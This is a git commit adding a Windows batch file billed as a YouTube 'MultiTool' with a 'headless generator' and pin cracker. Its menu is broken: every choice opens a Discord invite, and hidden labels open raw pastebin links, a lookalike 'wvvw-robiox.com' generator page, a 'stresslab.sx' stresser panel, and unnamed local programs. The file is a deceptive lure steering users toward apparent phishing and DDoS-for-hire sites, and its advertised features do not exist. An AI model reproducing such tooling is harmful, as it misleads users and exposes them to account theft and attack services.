775e2b3aa5b00459339ae83678c72e8ce0725100
v2. coder/helper/zy/githubber/coding <109872122+mp-8@users.noreply.github.com>
2022-09-11 18:46:07 -0400

    Add files via upload
    enjoy!

---
+++ MULTI TOOL!.bat
@@ -0,0 +1,79 @@
+@echo off
+chcp 65001 >nul
+:login
+cls
+color 3
+title YT MultiTool Tutorial
+echo.
+echo █╗   ██╗███████╗ █████╗ ██╗  ██╗    ████████╗ ██████╗  ██████╗ ██╗     
+echo ██╗ ██╔╝██╔════╝██╔══██╗██║  ██║    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
+echo ████╔╝ █████╗  ███████║███████║       ██║   ██║   ██║██║   ██║██║     
+echo  ╚██╔╝  ██╔══╝  ██╔══██║██╔══██║       ██║   ██║   ██║██║   ██║██║     
+echo   ██║   ███████╗██║  ██║██║  ██║       ██║   ╚██████╔╝╚██████╔╝███████╗
+echo   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════
+echo.
+                                                                        
+:main
+cls
+echo.
+echo ██╗   ██╗ ██████╗ ██╗   ██╗████████╗██╗   ██╗██████╗ ███████╗
+echo ╚██╗ ██╔╝██╔═══██╗██║   ██║╚══██╔══╝██║   ██║██╔══██╗██╔════╝
+echo  ╚████╔╝ ██║   ██║██║   ██║   ██║   ██║   ██║██████╔╝█████╗  
+echo   ╚██╔╝  ██║   ██║██║   ██║   ██║   ██║   ██║██╔══██╗██╔══╝  
+echo    ██║   ╚██████╔╝╚██████╔╝   ██║   ╚██████╔╝██████╔╝███████╗
+echo    ╚═╝    ╚═════╝  ╚═════╝    ╚═╝    ╚═════╝ ╚═════╝ ╚══════╝
+echo.
+echo.
+echo [1] - headless generator
+echo [1] - headless generator
+echo [1] - headless generator
+echo [1] - headless generator
+echo [1] - headless generator
+echo [1] - headless generator
+echo [1] - headless generator
+echo [1] - headless generator
+echo [1] - headless generator
+echo [1] - headless generator
+echo [1] - headless generator
+echo [1] - headless generator
+echo [1] - headless generator
+echo [1] - headless generator
+set /p main=Option: 
+if %main% == 1 goto o1
+echo.
+:o1
+start https://discord.gg/4mQdn7uQ7v
+goto main
+:o2
+start https://www.youtube.com/channel/UCI-X5ind8vbXIoJEhjwKrnQ
+goto main
+:o3
+start https://github.com/mp-8
+goto main
+:o4
+start https://pastebin.com/raw/sjP7u4AB
+goto main 
+:o5
+start https://fireliker.com/
+goto main
+:56
+start https://pastebin.com/raw/qiBUvZzn
+goto main
+:lol
+start https://story-of-jesus.xyz
+goto main
+:lmao
+start https://wvvw-robiox.com/creates/GEN-5HALFYOA/
+goto main
+:pincracker
+start pinc
+goto main
+:ip33
+start ip33
+goto main
+:best
+start https://stresslab.sx/u/panel
+goto main
+:lick
+start headless
+goto main
